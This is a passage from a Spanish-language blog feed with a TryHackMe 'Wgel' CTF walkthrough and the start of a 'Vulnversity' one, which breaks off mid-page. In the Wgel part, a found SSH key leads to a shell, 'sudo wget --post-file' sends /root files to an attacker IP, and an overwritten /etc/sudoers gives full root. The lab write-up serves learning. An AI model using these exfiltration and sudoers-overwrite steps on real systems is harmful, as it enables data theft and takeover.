&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Dec 27 19:44:55 2019 as: nmap -p- --min-rate 1000 -o scannmap 10.10.116.173&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.116.173
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.20s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Dec 27 19:46:23 2019 -- 1 IP address (1 host up) scanned in 87.39 seconds&lt;/span&gt;

Starting Nmap 7.80 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-12-27 19:47 CST
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.116.173
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.43s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;2048&lt;/span&gt; 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
80/tcp open  http    Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.18 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap &lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; IP address &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host up&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; scanned in 18.86 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;http&#34;&gt;HTTP&lt;/h3&gt;
&lt;p&gt;En el puerto 80 esta corriendo apache.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_19-49-07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Analizamos el codigo fuente del index de apache y econtramos un comentario que no es comun en el index de apache.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_20-19-13.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;gobuster---http&#34;&gt;GOBUSTER - HTTP&lt;/h4&gt;
&lt;p&gt;Escaneo de directorios y archivos con gobuster.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/wgel_ctf# gobuster dir -u http://10.10.116.173/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt -q
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/server-status &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 403&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/sitemap &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id=&#34;pagina-web-en-sitemap&#34;&gt;Pagina web en /sitemap/&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_19-55-12.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nuevamente hacemos un escaneo con gobuster pero ahora a la pagina que encontramos (&lt;code&gt;/sitemap/&lt;/code&gt;).&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/wgel_ctf# gobuster dir -u http://10.10.116.173/sitemap/ -w /usr/share/wordlists/dirb/common.txt -t &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt; -x php,html,txt -q
/.ssh &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/about.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/blog.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/contact.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/css &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/fonts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/images &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/js &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 301&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/services.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/shop.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/work.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
root@aoiri:~/tryhackme/wgel_ctf#
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos un directorio (&lt;code&gt;/.ssh&lt;/code&gt;) donde se encuentra una clave privada de ssh.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_19-57-31.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;ssh---jessie&#34;&gt;SSH - Jessie&lt;/h2&gt;
&lt;p&gt;Iniciamos session con &lt;code&gt;Jessie&lt;/code&gt; y la clave privada que encontramos anteriormente, obtenemos una shell ssh y nuestra primera flag &lt;strong&gt;user_flag.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_20-20-54.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_20-22-35.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y encomtramos que podemos correr el comando &lt;code&gt;wget&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_20-25-52.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Para obtener nuestra segunda flag utilizamos wget con el parametro &lt;code&gt;--post-file&lt;/code&gt; con la ruta del archivo y hacia la IP donde queremos enviar el archivo. Ponemos a la escucha netcat (local) en el puerto 80.&lt;/p&gt;
&lt;p&gt;Comando:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /usr/bin/wget --post-file&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/root/root_flag.txt 10.8.1.72
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_20-35-32.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Netcat con la flag &lt;strong&gt;root_flag.txt&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_20-36-02.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;root-shell&#34;&gt;ROOT SHELL&lt;/h2&gt;
&lt;p&gt;Para obtener una shell con privilegios de administracion primero obtenemos el archivo &lt;code&gt;/etc/sudoers&lt;/code&gt; mediante la misma forma que con la flag, editamos el archivo sudoers localmente agregando nuestra propia configuracion para el usuario Jessio.&lt;/p&gt;
&lt;p&gt;Cambiamos esta linea por la segunda en el archivo:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#jessie  ALL=(root) NOPASSWD: /usr/bin/wget&lt;/span&gt;
jessie  &lt;span class=&#34;nv&#34;&gt;ALL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=(&lt;/span&gt;ALL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; NOPASSWD: ALL
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Una vez hecho esto levantamos un servidor con python3 en la ruta donde se encuentra nuestro archivo &lt;code&gt;sudoers&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_20-59-07.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y en la maquina wgel ejecutamos el comando wget con sudo el cual va a sobreescribir el archivo &lt;code&gt;/etc/sudoers&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Nos ubicamos en la carpeta &lt;code&gt;/etc/&lt;/code&gt; y ejecutamos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo /usr/bin/wget 10.8.1.72/sudoers --output-document&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;sudoers
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_21-02-18.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Verificamos con el comando &lt;code&gt;sudo -l -l&lt;/code&gt; que la configuracion haya cambiado.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_21-02-51.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ejecutamos el comando &lt;code&gt;sudo su&lt;/code&gt; y obtenemos una shell con privilegios root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/wgel/Screenshot_2019-12-27_21-03-27.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/wgel/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/wgel/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Vulnversity</title>
        <link>https://sckull.github.io/posts/vulnversity/</link>
        <pubDate>Wed, 25 Dec 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Wed, 25 Dec 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/vulnversity/</guid>
        <description>Vulnversity es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Vulnversity es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/vulnversity/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Vulnversity&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Learn about active recon, web app attacks and privilege escalation.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;3685&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/&#34;&gt;tryhackme&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;-reconnaissance-&#34;&gt;{ Reconnaissance }&lt;/h2&gt;
&lt;p&gt;Comenzamos desde esta tarea, la primera es desplegar nuestra maquina. En esta tarea utilizamos nmap una herramienta para realizar un escaneo de hosts, puertos, servicios y ejecutar scripts en una red.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;nmap flag&lt;/th&gt;
&lt;th&gt;Descripcion&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-sv&lt;/td&gt;
&lt;td&gt;Determina la version del servicio&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-p &lt;x&gt; or -p-&lt;/td&gt;
&lt;td&gt;Escanea el puerto x o escanea todos los puertos&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-Pn&lt;/td&gt;
&lt;td&gt;Solo escanea puertos abiertos y no hosts&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-A&lt;/td&gt;
&lt;td&gt;Determina la version del SO y ejecuta scripts&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-sC&lt;/td&gt;
&lt;td&gt;Escanea con scripts por default&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-v&lt;/td&gt;
&lt;td&gt;Verbosidad&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-sU&lt;/td&gt;
&lt;td&gt;Puertos UDP&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-sS&lt;/td&gt;
&lt;td&gt;Puertos TCP&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Info From &lt;a href=&#34;https://tryhackme.com/room/vulnversity&#34;&gt;&lt;strong&gt;Vulnersity&lt;/strong&gt;&lt;/a&gt; room.&lt;/p&gt;
&lt;h3 id=&#34;nmap&#34;&gt;NMAP&lt;/h3&gt;
&lt;p&gt;Comenzamos escaneando todos los puertos tcp y servicios disponibles en el host y guardar el reporte en un archivo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Wed Dec 25 15:31:22 2019 as: nmap -sS -T4 -sV -p- -o nmap_scan 10.10.193.246&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.193.246
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.17s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65529&lt;/span&gt; closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 &lt;span class=&#34;o&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
Service Info: Host: VULNUNIVERSITY&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OSs: Unix, Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Dec 25 15:45:34 2019 -- 1 IP address (1 host up) scanned in 851.97 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;-locating-directories-using-gobuster-&#34;&gt;{ Locating directories using GoBuster }&lt;/h2&gt;
&lt;p&gt;Utilizamos GoBuster para escanear directorios y archivos en la pagina web que esta corriendo en el puerto 3333.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;GoBuster flag&lt;/th&gt;
&lt;th&gt;Descripcion&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;-e&lt;/td&gt;
&lt;td&gt;Imprime la URL completa&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-u&lt;/td&gt;
&lt;td&gt;La url Objetivo&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-w&lt;/td&gt;
&lt;td&gt;Direccion del wordlist&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-U&lt;/td&gt;
&lt;td&gt;y -P usuario y constraseña para autenticacion&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-p&lt;/td&gt;
&lt;td&gt;&lt;x&gt; Proxy para las peticiones&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;-c&lt;/td&gt;
&lt;td&gt;&lt;http cookies&gt;	Especifica el cookie para autenticacion&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Info From &lt;a href=&#34;https://tryhackme.com/room/vulnversity&#34;&gt;&lt;strong&gt;Vulnersity&lt;/strong&gt;&lt;/a&gt; room.&lt;/p&gt;
&lt;h3 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
